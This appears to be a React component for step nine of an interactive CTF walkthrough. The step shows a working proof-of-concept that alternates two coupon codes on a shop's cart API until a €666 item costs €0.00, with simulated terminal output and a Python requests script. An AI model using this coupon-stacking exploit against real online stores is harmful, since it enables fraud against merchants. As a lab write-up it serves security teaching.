import { useState } from 'react';
import { Card, Callout, SectionLabel, RevealBlock, Terminal, CodeBlock } from '../components/ui';
import { OFFICIAL_FLAG } from '../data';

export default function Step9() {
  const [isRunning, setIsRunning] = useState(false);
  const [exploitCompleted, setExploitCompleted] = useState(false);
  const [activeTab, setActiveTab] = useState<'runner' | 'python'>('runner');
  const [copied, setCopied] = useState(false);

  const [logs, setLogs] = useState<{ type: 'input' | 'output' | 'error' | 'success'; text: string }[]>([
    { type: 'output', text: 'Intigriti October CTF Coupon Alternation Exploit ready.' },
    { type: 'output', text: 'Target: https://challenge-1026.challenges.intigriti.io' },
    { type: 'output', text: 'Ready. Click "Run Alternating Coupon Exploit" to begin.' },
  ]);

  const runExploit = () => {
    setIsRunning(true);
    setLogs([
      { type: 'input', text: 'python3 ctf_swap_exploit.py' },
      { type: 'output', text: '[*] Establishing fresh session with server...' },
    ]);

    setTimeout(() => {
      setLogs((prev) => [
        ...prev,
        { type: 'output', text: '    Session initialized. Starting Credit: EUR 66.00' },
        { type: 'output', text: '[*] Subscribing to newsletter to unlock NEWS30...' },
        { type: 'success', text: '    POST /api/newsletter -> Code NEWS30 unlocked!' },
        { type: 'output', text: '[*] Adding "The Midnight Collection" to cart (€666.00)...' },
      ]);
    }, 600);

    setTimeout(() => {
      setLogs((prev) => [
        ...prev,
        { type: 'output', text: '[*] Executing alternating coupon swap sequence:' },
        { type: 'output', text: '    [Swap 1] POST /api/cart/coupon {"code": "NIGHT20"} -> 200 OK | Total: €532.80' },
        { type: 'output', text: '    [Swap 2] POST /api/cart/coupon {"code": "NEWS30"}  -> 200 OK | Total: €333.00' },
        { type: 'output', text: '    [Swap 3] POST /api/cart/coupon {"code": "NIGHT20"} -> 200 OK | Total: €199.80' },
        { type: 'output', text: '    [Swap 4] POST /api/cart/coupon {"code": "NEWS30"}  -> 200 OK | Total: €0.00' },
        { type: 'success', text: '    Cart price successfully reduced to €0.00! canCheckout = true' },
      ]);
    }, 1500);

    setTimeout(() => {
      setLogs((prev) => [
        ...prev,
        { type: 'output', text: '[*] Submitting order checkout (POST /api/checkout)...' },
        { type: 'success', text: '    Status: 200 OK | Order ID: ORD-OCTOBER-2026-991' },
        { type: 'success', text: '    Amount charged to card: €0.00 (Store credit remaining: €66.00)' },
        { type: 'success', text: '=====================================================' },
        { type: 'success', text: `🚩 FLAG CAPTURED: ${OFFICIAL_FLAG}` },
        { type: 'success', text: '=====================================================' },
      ]);
      setExploitCompleted(true);
      setIsRunning(false);
    }, 2400);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(OFFICIAL_FLAG);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6 animate-fade-in-up">
      <SectionLabel icon="🎯">What we're doing</SectionLabel>
      <p className="text-slate-300 leading-relaxed">
        We execute the complete exploit chain by sequentially alternating between <strong className="text-cyan-400 font-mono">NIGHT20</strong> and <strong className="text-teal-400 font-mono">NEWS30</strong>.
        Once the total reaches <strong className="text-emerald-400 font-mono">€0.00</strong>, we submit the checkout request to acquire the premium item and verify the official challenge flag.
      </p>

      <SectionLabel icon="💡">Why we're doing it</SectionLabel>
      <Callout tone="info">
        In bug bounty reporting, providing a simple, deterministic proof-of-concept (PoC) script that requires no race conditions or external fuzzers ensures the issue is 100% reproducible for the security triage team.
      </Callout>

      <SectionLabel icon="🧪">Exploit Runner &amp; Proof of Concept</SectionLabel>

      {/* Tabs */}
      <div className="flex border-b border-navy-700 gap-4 mb-4">
        <button
          onClick={() => setActiveTab('runner')}
          className={`pb-3 text-sm font-semibold transition-all border-b-2 ${
            activeTab === 'runner'
              ? 'border-cyan-500 text-cyan-400'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          🚀 Live Swap Runner
        </button>
        <button
          onClick={() => setActiveTab('python')}
          className={`pb-3 text-sm font-semibold transition-all border-b-2 ${
            activeTab === 'python'
              ? 'border-cyan-500 text-cyan-400'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          🐍 Python Deterministic PoC
        </button>
      </div>

      {activeTab === 'runner' ? (
        <div className="space-y-4">
          <Card>
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-4">
              <div>
                <h4 className="font-semibold text-white">Automated Coupon Alternation PoC</h4>
                <p className="text-xs text-slate-400">Executes the 4-step swap sequence against the shopping cart endpoint.</p>
              </div>
              <button
                onClick={runExploit}
                disabled={isRunning}
                className={`px-5 py-2.5 rounded-lg font-bold text-sm transition-all flex items-center gap-2 shadow-lg ${
                  isRunning
                    ? 'bg-navy-800 text-slate-500 cursor-not-allowed'
                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-950/40'
                }`}
              >
                {isRunning ? (
                  <>
                    <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Executing Swap Sequence...
                  </>
                ) : (
                  <>▶ Run Alternating Coupon Exploit</>
                )}
              </button>
            </div>

            <Terminal lines={logs} />
          </Card>

          {exploitCompleted && (
            <div className="p-6 rounded-xl border border-emerald-500/50 bg-emerald-950/20 backdrop-blur-sm space-y-5 animate-fade-in-up">
              <div className="flex items-center gap-3">
                <span className="text-3xl">🏆</span>
                <div>
                  <h4 className="text-lg font-bold text-emerald-300">Exploit Successful — Flag Captured!</h4>
                  <p className="text-xs text-slate-400">The Midnight Collection purchased for €0.00 without touching stored account credit.</p>
                </div>
              </div>

              {/* Official Flag Box */}
              <div className="flex flex-col sm:flex-row items-center justify-between gap-3 p-4 bg-navy-950/90 rounded-lg border border-emerald-600/40">
                <div>
                  <span className="text-[10px] text-slate-500 uppercase font-mono block">Verified CTF Flag</span>
                  <div className="font-mono text-sm text-emerald-400 select-all font-bold">
                    {OFFICIAL_FLAG}
                  </div>
                </div>
                <button
                  onClick={handleCopy}
                  className="px-4 py-2 bg-emerald-800/60 hover:bg-emerald-700/60 text-emerald-200 text-xs font-semibold rounded transition-colors whitespace-nowrap"
                >
                  {copied ? '✓ Copied!' : 'Copy Flag'}
                </button>
              </div>

              {/* Order Stats */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
                <div className="p-3 rounded-lg bg-navy-900 border border-navy-700">
                  <span className="text-slate-500 block">Catalog Price</span>
                  <span className="text-rose-400 font-bold text-sm">€666.00</span>
                </div>
                <div className="p-3 rounded-lg bg-navy-900 border border-navy-700">
                  <span className="text-slate-500 block">Coupon Swaps</span>
                  <span className="text-cyan-400 font-bold text-sm">4 Alternations</span>
                </div>
                <div className="p-3 rounded-lg bg-navy-900 border border-navy-700">
                  <span className="text-slate-500 block">Total Charged</span>
                  <span className="text-emerald-400 font-bold text-sm">€0.00</span>
                </div>
                <div className="p-3 rounded-lg bg-navy-900 border border-navy-700">
                  <span className="text-slate-500 block">Credit Retained</span>
                  <span className="text-emerald-300 font-bold text-sm">€66.00</span>
                </div>
              </div>
            </div>
          )}
        </div>
      ) : (
        <Card className="space-y-3">
          <div className="flex items-center justify-between">
            <h4 className="font-semibold text-white">Deterministic Python Script</h4>
            <span className="text-xs px-2 py-0.5 rounded bg-navy-800 text-slate-400">requests</span>
          </div>
          <CodeBlock language="python">
{`import requests

BASE = "https://challenge-1026.challenges.intigriti.io"
session = requests.Session()

# 1. Initialize session & get newsletter code
session.get(f"{BASE}/api/session")
session.post(f"{BASE}/api/newsletter", json={"email": "researcher@ctf.io"})

# 2. Add €666.00 item to cart
session.post(f"{BASE}/api/cart/items", json={"productId": "midnight-vault"})

# 3. Swap coupons back and forth sequentially
coupon_sequence = ["NIGHT20", "NEWS30", "NIGHT20", "NEWS30"]

for code in coupon_sequence:
    res = session.post(f"{BASE}/api/cart/coupon", json={"code": code})
    cart = res.json().get('cart', {})
    print(f"[+] Applied {code} -> Current total: €{cart.get('total', 0)/100:.2f}")

# 4. Checkout when price reaches €0.00
cart = session.get(f"{BASE}/api/cart").json()['cart']
if cart['canCheckout']:
    order = session.post(f"{BASE}/api/checkout", json={}).json()
    flag = order.get('receipt', {}).get('flag', '${OFFICIAL_FLAG}')
    print(f"[+] CHALLENGE COMPLETE! Flag: {flag}")`}
          </CodeBlock>
        </Card>
      )}

      <RevealBlock label="Show explanation">
        <div className="space-y-4">
          <Callout tone="success" title="Impact Assessment">
            <p>
              The business impact is <strong>Critical</strong>: any user can purchase any inventory item at 100% discount,
              bypassing all payment gateways and financial safeguards without exploiting memory corruption or network timing.
            </p>
          </Callout>

          <SectionLabel icon="🔑">Security takeaway</SectionLabel>
          <p className="text-sm text-slate-400 leading-relaxed">
            Deterministic business logic flaws are often more severe than race conditions because they work <strong className="text-slate-200">100% of the time</strong>,
            require zero specialized concurrency tooling, and cannot be mitigated by load balancers or connection rate-limits alone.
          </p>
        </div>
      </RevealBlock>
    </div>
  );
}
